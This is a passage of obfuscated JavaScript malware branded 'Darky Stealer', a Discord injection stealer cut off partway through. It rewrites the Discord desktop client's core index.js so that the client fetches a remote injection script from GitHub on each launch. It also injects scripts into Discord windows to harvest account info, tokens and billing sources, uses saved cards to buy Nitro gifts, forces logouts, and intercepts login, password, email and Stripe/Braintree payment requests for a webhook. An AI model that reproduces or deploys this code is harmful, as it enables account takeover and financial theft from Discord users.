const _0x1dbe75=_0x4881;(function(_0x4031d3,_0x3f0a7c){const _0x5d4e6b=_0x4881,_0xf337d7=_0x4031d3();while(!![]){try{const _0x541a98=-parseInt(_0x5d4e6b(0x1ad))/0x1+parseInt(_0x5d4e6b(0x1f9))/0x2*(parseInt(_0x5d4e6b(0x1c2))/0x3)+parseInt(_0x5d4e6b(0x1dc))/0x4+parseInt(_0x5d4e6b(0x183))/0x5*(parseInt(_0x5d4e6b(0x207))/0x6)+parseInt(_0x5d4e6b(0x1cd))/0x7*(-parseInt(_0x5d4e6b(0x19e))/0x8)+-parseInt(_0x5d4e6b(0x1df))/0x9*(-parseInt(_0x5d4e6b(0x18f))/0xa)+parseInt(_0x5d4e6b(0x22c))/0xb*(-parseInt(_0x5d4e6b(0x245))/0xc);if(_0x541a98===_0x3f0a7c)break;else _0xf337d7['push'](_0xf337d7['shift']());}catch(_0x1f455e){_0xf337d7['push'](_0xf337d7['shift']());}}}(_0x3e60,0x7c33e));const args=process[_0x1dbe75(0x1cc)],fs=require('fs'),path=require('path'),https=require(_0x1dbe75(0x1f6)),querystring=require(_0x1dbe75(0x1bd)),{BrowserWindow,session}=require(_0x1dbe75(0x24c)),encodedHook='%WEBHOOKHEREBASE64ENCODED%',config={'webhook':atob(encodedHook),'webhook_protector_key':_0x1dbe75(0x1c9),'auto_buy_nitro':![],'ping_on_run':!![],'ping_val':_0x1dbe75(0x1c5),'embed_name':_0x1dbe75(0x18d),'embed_icon':_0x1dbe75(0x199),'embed_color':0x560ddc,'injection_url':_0x1dbe75(0x1eb),'api':_0x1dbe75(0x227),'nitro':{'boost':{'year':{'id':_0x1dbe75(0x1be),'sku':_0x1dbe75(0x219),'price':_0x1dbe75(0x208)},'month':{'id':_0x1dbe75(0x1be),'sku':'511651880837840896','price':_0x1dbe75(0x182)}},'classic':{'month':{'id':_0x1dbe75(0x181),'sku':_0x1dbe75(0x1dd),'price':_0x1dbe75(0x1e6)}}},'filter':{'urls':[_0x1dbe75(0x21e),_0x1dbe75(0x248),_0x1dbe75(0x1a7),'https://discordapp.com/api/v*/auth/login',_0x1dbe75(0x232),_0x1dbe75(0x196),_0x1dbe75(0x24f),_0x1dbe75(0x1a8),'https://api.stripe.com/v*/setup_intents/*/confirm',_0x1dbe75(0x1fd)]},'filter2':{'urls':[_0x1dbe75(0x220),_0x1dbe75(0x1bf),_0x1dbe75(0x211),_0x1dbe75(0x185),'https://discord.com/api/v*/users/@me/library',_0x1dbe75(0x23a)]}};function parity_32(_0x53d471,_0x329ddf,_0x4a733f){return _0x53d471^_0x329ddf^_0x4a733f;}function ch_32(_0x47df62,_0x2eda68,_0xfdcf20){return _0x47df62&_0x2eda68^~_0x47df62&_0xfdcf20;}function maj_32(_0x128739,_0x3920ad,_0x44cd3c){return _0x128739&_0x3920ad^_0x128739&_0x44cd3c^_0x3920ad&_0x44cd3c;}function rotl_32(_0x583e16,_0x3f6533){return _0x583e16<<_0x3f6533|_0x583e16>>>0x20-_0x3f6533;}function safeAdd_32_2(_0x3e8c5f,_0x1a7a54){var _0x50da2f=(_0x3e8c5f&0xffff)+(_0x1a7a54&0xffff),_0x5b1148=(_0x3e8c5f>>>0x10)+(_0x1a7a54>>>0x10)+(_0x50da2f>>>0x10);return(_0x5b1148&0xffff)<<0x10|_0x50da2f&0xffff;}function safeAdd_32_5(_0x5ca3b1,_0x305d95,_0x55484d,_0x604959,_0x2c350b){var _0x2bde72=(_0x5ca3b1&0xffff)+(_0x305d95&0xffff)+(_0x55484d&0xffff)+(_0x604959&0xffff)+(_0x2c350b&0xffff),_0x39b49c=(_0x5ca3b1>>>0x10)+(_0x305d95>>>0x10)+(_0x55484d>>>0x10)+(_0x604959>>>0x10)+(_0x2c350b>>>0x10)+(_0x2bde72>>>0x10);return(_0x39b49c&0xffff)<<0x10|_0x2bde72&0xffff;}function binb2hex(_0xca9c75){const _0x2cee4b=_0x1dbe75;var _0x46475e=_0x2cee4b(0x1ee),_0x13c811='',_0xdc8355=_0xca9c75['length']*0x4,_0x2ecae4,_0x199f06;for(_0x2ecae4=0x0;_0x2ecae4<_0xdc8355;_0x2ecae4+=0x1){_0x199f06=_0xca9c75[_0x2ecae4>>>0x2]>>>(0x3-_0x2ecae4%0x4)*0x8,_0x13c811+=_0x46475e[_0x2cee4b(0x218)](_0x199f06>>>0x4&0xf)+_0x46475e['charAt'](_0x199f06&0xf);}return _0x13c811;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x5ab629,_0x131ef0){var _0x17ee70=[],_0x2f2612,_0x56d375,_0x5153d2,_0x4890a9,_0x5200b4,_0x18f488,_0x5b47a1=ch_32,_0x3fc40e=parity_32,_0x43017c=maj_32,_0x118fd4=rotl_32,_0x409575=safeAdd_32_2,_0x11d967,_0x4166ec=safeAdd_32_5;_0x2f2612=_0x131ef0[0x0],_0x56d375=_0x131ef0[0x1],_0x5153d2=_0x131ef0[0x2],_0x4890a9=_0x131ef0[0x3],_0x5200b4=_0x131ef0[0x4];for(_0x11d967=0x0;_0x11d967<0x50;_0x11d967+=0x1){_0x11d967<0x10?_0x17ee70[_0x11d967]=_0x5ab629[_0x11d967]:_0x17ee70[_0x11d967]=_0x118fd4(_0x17ee70[_0x11d967-0x3]^_0x17ee70[_0x11d967-0x8]^_0x17ee70[_0x11d967-0xe]^_0x17ee70[_0x11d967-0x10],0x1);if(_0x11d967<0x14)_0x18f488=_0x4166ec(_0x118fd4(_0x2f2612,0x5),_0x5b47a1(_0x56d375,_0x5153d2,_0x4890a9),_0x5200b4,0x5a827999,_0x17ee70[_0x11d967]);else{if(_0x11d967<0x28)_0x18f488=_0x4166ec(_0x118fd4(_0x2f2612,0x5),_0x3fc40e(_0x56d375,_0x5153d2,_0x4890a9),_0x5200b4,0x6ed9eba1,_0x17ee70[_0x11d967]);else _0x11d967<0x3c?_0x18f488=_0x4166ec(_0x118fd4(_0x2f2612,0x5),_0x43017c(_0x56d375,_0x5153d2,_0x4890a9),_0x5200b4,0x8f1bbcdc,_0x17ee70[_0x11d967]):_0x18f488=_0x4166ec(_0x118fd4(_0x2f2612,0x5),_0x3fc40e(_0x56d375,_0x5153d2,_0x4890a9),_0x5200b4,0xca62c1d6,_0x17ee70[_0x11d967]);}_0x5200b4=_0x4890a9,_0x4890a9=_0x5153d2,_0x5153d2=_0x118fd4(_0x56d375,0x1e),_0x56d375=_0x2f2612,_0x2f2612=_0x18f488;}return _0x131ef0[0x0]=_0x409575(_0x2f2612,_0x131ef0[0x0]),_0x131ef0[0x1]=_0x409575(_0x56d375,_0x131ef0[0x1]),_0x131ef0[0x2]=_0x409575(_0x5153d2,_0x131ef0[0x2]),_0x131ef0[0x3]=_0x409575(_0x4890a9,_0x131ef0[0x3]),_0x131ef0[0x4]=_0x409575(_0x5200b4,_0x131ef0[0x4]),_0x131ef0;}function finalizeSHA1(_0x2a4a4e,_0x3398b0,_0x214f07,_0x4e8f9d){const _0x1f2c1a=_0x1dbe75;var _0x41e0c8,_0x37b87b,_0x3d29f4;_0x3d29f4=(_0x3398b0+0x41>>>0x9<<0x4)+0xf;while(_0x2a4a4e[_0x1f2c1a(0x240)]<=_0x3d29f4){_0x2a4a4e[_0x1f2c1a(0x18a)](0x0);}_0x2a4a4e[_0x3398b0>>>0x5]|=0x80<<0x18-_0x3398b0%0x20,_0x2a4a4e[_0x3d29f4]=_0x3398b0+_0x214f07,_0x37b87b=_0x2a4a4e['length'];for(_0x41e0c8=0x0;_0x41e0c8<_0x37b87b;_0x41e0c8+=0x10){_0x4e8f9d=roundSHA1(_0x2a4a4e[_0x1f2c1a(0x205)](_0x41e0c8,_0x41e0c8+0x10),_0x4e8f9d);}return _0x4e8f9d;}function hex2binb(_0x49cc4a,_0x139ef0,_0x4b3312){const _0x33675d=_0x1dbe75;var _0x54dbf9,_0x1ef1fc=_0x49cc4a[_0x33675d(0x240)],_0x56e8dc,_0x1c2073,_0x39c94d,_0x5bba00,_0x545f5b;_0x54dbf9=_0x139ef0||[0x0],_0x4b3312=_0x4b3312||0x0,_0x545f5b=_0x4b3312>>>0x3;0x0!==_0x1ef1fc%0x2&&console[_0x33675d(0x1a3)]('String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments');for(_0x56e8dc=0x0;_0x56e8dc<_0x1ef1fc;_0x56e8dc+=0x2){_0x1c2073=parseInt(_0x49cc4a[_0x33675d(0x202)](_0x56e8dc,0x2),0x10);if(!isNaN(_0x1c2073)){_0x5bba00=(_0x56e8dc>>>0x1)+_0x545f5b,_0x39c94d=_0x5bba00>>>0x2;while(_0x54dbf9[_0x33675d(0x240)]<=_0x39c94d){_0x54dbf9[_0x33675d(0x18a)](0x0);}_0x54dbf9[_0x39c94d]|=_0x1c2073<<0x8*(0x3-_0x5bba00%0x4);}else console['error'](_0x33675d(0x1ce));}return{'value':_0x54dbf9,'binLen':_0x1ef1fc*0x4+_0x4b3312};}class jsSHA{constructor(){const _0x29beb6=_0x1dbe75;var _0x18e8cf=0x0,_0x54db63=[],_0x1dea9e=0x0,_0xbd1e55,_0x4ced0d,_0x137269,_0x16998e,_0x4049a3,_0xbe3869,_0x5480ef=![],_0x240e2e=![],_0x3dd789=[],_0x12daa2=[],_0x21d040,_0x21d040=0x1;_0x4ced0d=hex2binb,(_0x21d040!==parseInt(_0x21d040,0xa)||0x1>_0x21d040)&&console[_0x29beb6(0x1a3)](_0x29beb6(0x187)),_0x16998e=0x200,_0x4049a3=roundSHA1,_0xbe3869=finalizeSHA1,_0x137269=0xa0,_0xbd1e55=getH(),this[_0x29beb6(0x1b2)]=function(_0x32408f){const _0x24372a=_0x29beb6;var _0x3ab867,_0xa04d44,_0x55cab1,_0x323920,_0x4518e1,_0x283907,_0x1f62f7;_0x3ab867=hex2binb,_0xa04d44=_0x3ab867(_0x32408f),_0x55cab1=_0xa04d44[_0x24372a(0x1a0)],_0x323920=_0xa04d44[_0x24372a(0x20f)],_0x4518e1=_0x16998e>>>0x3,_0x1f62f7=_0x4518e1/0x4-0x1;if(_0x4518e1<_0x55cab1/0x8){_0x323920=_0xbe3869(_0x323920,_0x55cab1,0x0,getH());while(_0x323920['length']<=_0x1f62f7){_0x323920[_0x24372a(0x18a)](0x0);}_0x323920[_0x1f62f7]&=0xffffff00;}else{if(_0x4518e1>_0x55cab1/0x8){while(_0x323920[_0x24372a(0x240)]<=_0x1f62f7){_0x323920[_0x24372a(0x18a)](0x0);}_0x323920[_0x1f62f7]&=0xffffff00;}}for(_0x283907=0x0;_0x283907<=_0x1f62f7;_0x283907+=0x1){_0x3dd789[_0x283907]=_0x323920[_0x283907]^0x36363636,_0x12daa2[_0x283907]=_0x323920[_0x283907]^0x5c5c5c5c;}_0xbd1e55=_0x4049a3(_0x3dd789,_0xbd1e55),_0x18e8cf=_0x16998e,_0x240e2e=!![];},this[_0x29beb6(0x1e4)]=function(_0x20129b){const _0x42789a=_0x29beb6;var _0x3b1fe8,_0x131c33,_0x2cb5ba,_0x3ed910,_0x3f333d,_0xa9cc01=0x0,_0x3b3b17=_0x16998e>>>0x5;_0x3b1fe8=_0x4ced0d(_0x20129b,_0x54db63,_0x1dea9e),_0x131c33=_0x3b1fe8['binLen'],_0x3ed910=_0x3b1fe8[_0x42789a(0x20f)],_0x2cb5ba=_0x131c33>>>0x5;for(_0x3f333d=0x0;_0x3f333d<_0x2cb5ba;_0x3f333d+=_0x3b3b17){_0xa9cc01+_0x16998e<=_0x131c33&&(_0xbd1e55=_0x4049a3(_0x3ed910[_0x42789a(0x205)](_0x3f333d,_0x3f333d+_0x3b3b17),_0xbd1e55),_0xa9cc01+=_0x16998e);}_0x18e8cf+=_0xa9cc01,_0x54db63=_0x3ed910[_0x42789a(0x205)](_0xa9cc01>>>0x5),_0x1dea9e=_0x131c33%_0x16998e;},this['getHMAC']=function(){const _0x607dd2=_0x29beb6;var _0x3de8ad;![]===_0x240e2e&&console[_0x607dd2(0x1a3)](_0x607dd2(0x1ed));const _0x559f74=function(_0x542d54){return binb2hex(_0x542d54);};return![]===_0x5480ef&&(_0x3de8ad=_0xbe3869(_0x54db63,_0x1dea9e,_0x18e8cf,_0xbd1e55),_0xbd1e55=_0x4049a3(_0x12daa2,getH()),_0xbd1e55=_0xbe3869(_0x3de8ad,_0x137269,_0x16998e,_0xbd1e55)),_0x5480ef=!![],_0x559f74(_0xbd1e55);};}}if(_0x1dbe75(0x1ac)===typeof define&&define[_0x1dbe75(0x1ea)])define(function(){return jsSHA;});else'undefined'!==typeof exports?_0x1dbe75(0x1d5)!==typeof module&&module[_0x1dbe75(0x1af)]?module['exports']=exports=jsSHA:exports=jsSHA:global[_0x1dbe75(0x192)]=jsSHA;function _0x3e60(){const _0x1eda8c=['nitro','forEach','year','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','521846918637420545','999','3662350BYXZZq','APPDATA','https://*.discord.com/api/v*/users/@me/library','darwin','numRounds\x20must\x20a\x20integer\x20>=\x201','**\x0aBadges:\x20**','onHeadersReceived','push','\x5cdiscord_desktop_core\x5cindex.js','webhook','Darky\x20Stealer','7fffffff','775630SZiIdU','onCompleted','**PayPal\x20Added**','jsSHA','discriminator','executeJavaScript','rmdirSync','https://*.discord.com/api/v*/auth/login','content','Email:\x20**','https://raw.githubusercontent.com/AbyssRaider/png/main/darky.jpg','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','round','**Nitro\x20bought!**','embed_icon','965072gfPmRl','Nitro\x20Basic','binLen','platform','injection_url','error','content-security-policy-report-only','login','Discord\x20Staff','https://*.discord.com/api/v*/users/@me','https://api.stripe.com/v*/tokens','parse','split','protocol','function','205641LIpUTR','package.json','exports','flags','POST','setHMACKey','**\x0aBilling:\x20**','PATCH','Contents','uploadData','webhook_protector_key','concat','username','stringify','Nitro','discord','querystring','521847234246082599','https://*.discord.com/api/v*/applications/detectable','includes','discord.com','1432437QavWRa','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','(Unknown)','@everyone','Early\x20Supporter','log','users/@me','%WEBHOOK_KEY%','max','env','argv','28dCbdqP','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','confirm','paypal_accounts','**Credit\x20Card\x20Added**','defaultSession','embed_name','webRequest','undefined','<:paypal:951139189389410365>','**Account\x20Info**','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','existsSync','default','1302704dzijho','511651871736201216','statusCode','36WJyxft','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27','onBeforeRequest','.webp','ping_val','update','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','499','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','app.asar','**\x0aNew\x20Password:\x20**','amd','https://raw.githubusercontent.com/AbyssRaider/jsobs/main/obsinj.js','boost','Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key','0123456789abcdef','premium_type','index.js','gift_code','HypeSquad\x20Balance','Partnered\x20Server\x20Owner','sku','password','https','auto_buy_nitro','getAllWindows','4WTOVbO','request','win32','Nitro\x20Type:\x20**','https://api.stripe.com/v*/payment_intents/*/confirm','url','card[exp_year]','https://cdn.discordapp.com/avatars/','Discord\x20Bug\x20Hunter\x20(Golden)','substr','writeFileSync','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','slice','webContents','6wvOlii','9999','card[cvc]','responseHeaders','tokens','host','\x5cmodules\x5c','from','value','initiation','https://discord.com/api/v*/applications/detectable','now','startsWith','\x20|\x20','**Token**','join','invalid','charAt','511651885459963904','default-src\x20\x27*\x27','pathname','method','Active\x20Developer','https://discord.com/api/v*/users/@me','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','HypeSquad\x20Brilliance','Failed\x20to\x20Purchase\x20❌','api','Authorization','**\x0aOld\x20Password:\x20**','\x27;\x0aconst\x20bdPath\x20=\x20\x27','https://discord.com/api/v9/users/@me','toString','replace','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','price','12390895otzPaN','embed_color','Discord\x20Bug\x20Hunter\x20(Normal)','app','wss://remote-auth-gateway','sep','https://discord.com/api/v*/auth/login','lenght','email','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','endsWith','floor','Access-Control-Allow-Headers\x20\x27*\x27','ping_on_run','wss://remote-auth-gateway.discord.gg/*','card[exp_month]','new_password','));\x0a\x20\x20\x20\x20xmlHttp.responseText','assign','Resources','length','\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOKHEREBASE64ENCODED%\x27,\x20\x27','avatar','HypeSquad\x20Bravery','end','12naHLAm','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','Moderator\x20Programs\x20Alumni','https://discordapp.com/api/v*/users/@me','month','**Discord\x20Info**','catch','electron','bytes','New\x20Email:\x20**','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','unlinkSync'];_0x3e60=function(){return _0x1eda8c;};return _0x3e60();}jsSHA[_0x1dbe75(0x1db)]&&(jsSHA=jsSHA[_0x1dbe75(0x1db)]);function totp(_0x401ba0){const _0x2da4d6=_0x1dbe75,_0x1672f0=0x1e,_0x3cd174=0x6,_0x2e932c=Date[_0x2da4d6(0x212)](),_0x2af146=Math[_0x2da4d6(0x19b)](_0x2e932c/0x3e8),_0x403d0c=leftpad(dec2hex(Math[_0x2da4d6(0x237)](_0x2af146/_0x1672f0)),0x10,'0'),_0x4b6562=new jsSHA();_0x4b6562[_0x2da4d6(0x1b2)](base32tohex(_0x401ba0)),_0x4b6562[_0x2da4d6(0x1e4)](_0x403d0c);const _0x2f5545=_0x4b6562['getHMAC'](),_0xf551c9=hex2dec(_0x2f5545['substring'](_0x2f5545[_0x2da4d6(0x240)]-0x1));let _0xab47b8=(hex2dec(_0x2f5545[_0x2da4d6(0x202)](_0xf551c9*0x2,0x8))&hex2dec(_0x2da4d6(0x18e)))+'';return _0xab47b8=_0xab47b8[_0x2da4d6(0x202)](Math[_0x2da4d6(0x1ca)](_0xab47b8[_0x2da4d6(0x240)]-_0x3cd174,0x0),_0x3cd174),_0xab47b8;}function hex2dec(_0x5e90b8){return parseInt(_0x5e90b8,0x10);}function dec2hex(_0x11bf58){const _0x4fadb5=_0x1dbe75;return(_0x11bf58<15.5?'0':'')+Math[_0x4fadb5(0x19b)](_0x11bf58)['toString'](0x10);}function base32tohex(_0x75c7e1){const _0x6ea70c=_0x1dbe75;let _0x3bca1d=_0x6ea70c(0x22a),_0x5caac5='',_0xa619d5='';_0x75c7e1=_0x75c7e1[_0x6ea70c(0x229)](/=+$/,'');for(let _0x14e395=0x0;_0x14e395<_0x75c7e1['length'];_0x14e395++){let _0x233ad4=_0x3bca1d['indexOf'](_0x75c7e1[_0x6ea70c(0x218)](_0x14e395)['toUpperCase']());if(_0x233ad4===-0x1)console[_0x6ea70c(0x1a3)]('Invalid\x20base32\x20character\x20in\x20key');_0x5caac5+=leftpad(_0x233ad4[_0x6ea70c(0x228)](0x2),0x5,'0');}for(let _0x1e6bc1=0x0;_0x1e6bc1+0x8<=_0x5caac5[_0x6ea70c(0x240)];_0x1e6bc1+=0x8){let _0x3b3616=_0x5caac5[_0x6ea70c(0x202)](_0x1e6bc1,0x8);_0xa619d5=_0xa619d5+leftpad(parseInt(_0x3b3616,0x2)[_0x6ea70c(0x228)](0x10),0x2,'0');}return _0xa619d5;}function leftpad(_0x1f6ec2,_0x3584dd,_0x2a28a5){const _0x24ae2c=_0x1dbe75;return _0x3584dd+0x1>=_0x1f6ec2[_0x24ae2c(0x240)]&&(_0x1f6ec2=Array(_0x3584dd+0x1-_0x1f6ec2[_0x24ae2c(0x240)])[_0x24ae2c(0x216)](_0x2a28a5)+_0x1f6ec2),_0x1f6ec2;}function _0x4881(_0x5eae9e,_0x45e02b){const _0x3e60c9=_0x3e60();return _0x4881=function(_0x48818c,_0x2789d5){_0x48818c=_0x48818c-0x17f;let _0x2a0c90=_0x3e60c9[_0x48818c];return _0x2a0c90;},_0x4881(_0x5eae9e,_0x45e02b);}const discordPath=(function(){const _0x4bdf80=_0x1dbe75,_0x72cd56=args[0x0][_0x4bdf80(0x1aa)](path[_0x4bdf80(0x231)])[_0x4bdf80(0x205)](0x0,-0x1)[_0x4bdf80(0x216)](path[_0x4bdf80(0x231)]);let _0x2896a4;if(process[_0x4bdf80(0x1a1)]===_0x4bdf80(0x1fb))_0x2896a4=path[_0x4bdf80(0x216)](_0x72cd56,'resources');else process[_0x4bdf80(0x1a1)]===_0x4bdf80(0x186)&&(_0x2896a4=path[_0x4bdf80(0x216)](_0x72cd56,_0x4bdf80(0x1b5),_0x4bdf80(0x23f)));if(fs['existsSync'](_0x2896a4))return{'resourcePath':_0x2896a4,'app':_0x72cd56};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x30de4d=_0x1dbe75,{resourcePath:_0x342a7e,app:_0x262be3}=discordPath;if(_0x342a7e===undefined||_0x262be3===undefined)return;const _0x392fff=path[_0x30de4d(0x216)](_0x342a7e,_0x30de4d(0x22f)),_0x425cd4=path['join'](_0x392fff,_0x30de4d(0x1ae)),_0x496cdd=path[_0x30de4d(0x216)](_0x392fff,_0x30de4d(0x1f0)),_0xf2e1be=fs['readdirSync'](_0x262be3+_0x30de4d(0x20d))['filter'](_0x20136d=>/discord_desktop_core-+?/['test'](_0x20136d))[0x0],_0xbe4ab7=_0x262be3+_0x30de4d(0x20d)+_0xf2e1be+_0x30de4d(0x18b),_0x2d41a7=path[_0x30de4d(0x216)](process[_0x30de4d(0x1cb)][_0x30de4d(0x184)],'\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');if(!fs[_0x30de4d(0x1da)](_0x392fff))fs['mkdirSync'](_0x392fff);if(fs[_0x30de4d(0x1da)](_0x425cd4))fs[_0x30de4d(0x250)](_0x425cd4);if(fs[_0x30de4d(0x1da)](_0x496cdd))fs['unlinkSync'](_0x496cdd);if(process[_0x30de4d(0x1a1)]==='win32'||process[_0x30de4d(0x1a1)]===_0x30de4d(0x186)){fs[_0x30de4d(0x203)](_0x425cd4,JSON[_0x30de4d(0x1ba)]({'name':_0x30de4d(0x1bc),'main':_0x30de4d(0x1f0)},null,0x4));const _0x5b4617=_0x30de4d(0x1d9)+_0xbe4ab7+_0x30de4d(0x226)+_0x2d41a7+_0x30de4d(0x180)+config[_0x30de4d(0x1a2)]+_0x30de4d(0x241)+encodedHook+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27'+config[_0x30de4d(0x1b7)]+_0x30de4d(0x1e0)+path[_0x30de4d(0x216)](_0x342a7e,_0x30de4d(0x1e8))+_0x30de4d(0x19a);fs['writeFileSync'](_0x496cdd,_0x5b4617[_0x30de4d(0x229)](/\\/g,'\x5c\x5c'));}if(!fs[_0x30de4d(0x1da)](path['join'](__dirname,_0x30de4d(0x210))))return!0x0;return fs[_0x30de4d(0x195)](path[_0x30de4d(0x216)](__dirname,_0x30de4d(0x210))),execScript(_0x30de4d(0x1d8)),!0x1;}const execScript=_0x501fce=>{const _0x497693=_0x1dbe75,_0x387363=BrowserWindow[_0x497693(0x1f8)]()[0x0];return _0x387363[_0x497693(0x206)][_0x497693(0x194)](_0x501fce,!0x0);},getInfo=async _0x4f4343=>{const _0x388606=_0x1dbe75,_0x523ac1=await execScript(_0x388606(0x21f)+config[_0x388606(0x223)]+_0x388606(0x204)+_0x4f4343+_0x388606(0x246));return JSON[_0x388606(0x1a9)](_0x523ac1);},fetchBilling=async _0x3a5b0f=>{const _0x43a3a0=_0x1dbe75,_0x36099f=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x43a3a0(0x223)]+_0x43a3a0(0x1e5)+_0x3a5b0f+_0x43a3a0(0x235));if(!_0x36099f[_0x43a3a0(0x233)]||_0x36099f[_0x43a3a0(0x240)]===0x0)return'';return JSON['parse'](_0x36099f);},getBilling=async _0x187422=>{const _0xf786d3=_0x1dbe75,_0x5cb6de=await fetchBilling(_0x187422);if(!_0x5cb6de)return'❌';const _0x4fae25=[];_0x5cb6de['forEach'](_0x16d633=>{const _0x160ba5=_0x4881;if(!_0x16d633['invalid'])switch(_0x16d633['type']){case 0x1:_0x4fae25[_0x160ba5(0x18a)]('💳');break;case 0x2:_0x4fae25['push'](_0x160ba5(0x1d6));break;default:_0x4fae25['push'](_0x160ba5(0x1c4));}});if(_0x4fae25[_0xf786d3(0x240)]==0x0)_0x4fae25[_0xf786d3(0x18a)]('❌');return _0x4fae25[_0xf786d3(0x216)]('\x20');},Purchase=async(_0xfae62a,_0x31ebe4,_0x437a45,_0x2f4dfd)=>{const _0x24f745=_0x1dbe75,_0x3613fa={'expected_amount':config[_0x24f745(0x251)][_0x437a45][_0x2f4dfd][_0x24f745(0x22b)],'expected_currency':'usd','gift':!![],'payment_source_id':_0x31ebe4,'payment_source_token':null,'purchase_token':'2422867c-244d-476a-ba4f-36e197758d97','sku_subscription_plan_id':config[_0x24f745(0x251)][_0x437a45][_0x2f4dfd][_0x24f745(0x1f4)]},_0x1a8ec9=execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/'+config[_0x24f745(0x251)][_0x437a45][_0x2f4dfd]['id']+'/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22'+_0xfae62a+_0x24f745(0x1e7)+JSON[_0x24f745(0x1ba)](_0x3613fa)+_0x24f745(0x23d));if(_0x1a8ec9['gift_code'])return'https://discord.gift/'+_0x1a8ec9[_0x24f745(0x1f1)];else return null;},buyNitro=async _0x4e83b3=>{const _0x22ccb4=_0x1dbe75,_0x1d02a7=await fetchBilling(_0x4e83b3),_0x59c417=_0x22ccb4(0x222);if(!_0x1d02a7)return _0x59c417;let _0x1ce291=[];_0x1d02a7[_0x22ccb4(0x252)](_0x1d8d06=>{const _0x5d27fb=_0x22ccb4;!_0x1d8d06[_0x5d27fb(0x217)]&&(_0x1ce291=_0x1ce291[_0x5d27fb(0x1b8)](_0x1d8d06['id']));});for(let _0x144d6c in _0x1ce291){const _0x56fed4=Purchase(_0x4e83b3,_0x144d6c,_0x22ccb4(0x1ec),_0x22ccb4(0x17f));if(_0x56fed4!==null)return _0x56fed4;else{const _0x4fa535=Purchase(_0x4e83b3,_0x144d6c,_0x22ccb4(0x1ec),_0x22ccb4(0x249));if(_0x4fa535!==null)return _0x4fa535;else{const _0xddd524=Purchase(_0x4e83b3,_0x144d6c,'classic',_0x22ccb4(0x249));return _0xddd524!==null?_0xddd524:_0x59c417;}}}},getNitro=_0x2caa61=>{const _0x5e7ee5=_0x1dbe75;switch(_0x2caa61){case 0x0:return'No\x20Nitro';case 0x1:return'Nitro\x20Classic';case 0x2:return _0x5e7ee5(0x1bb);case 0x3:return _0x5e7ee5(0x19f);default:return _0x5e7ee5(0x1c4);}},getBadges=_0x237854=>{const _0x35ccbb=_0x1dbe75,_0x526ab2=[];return 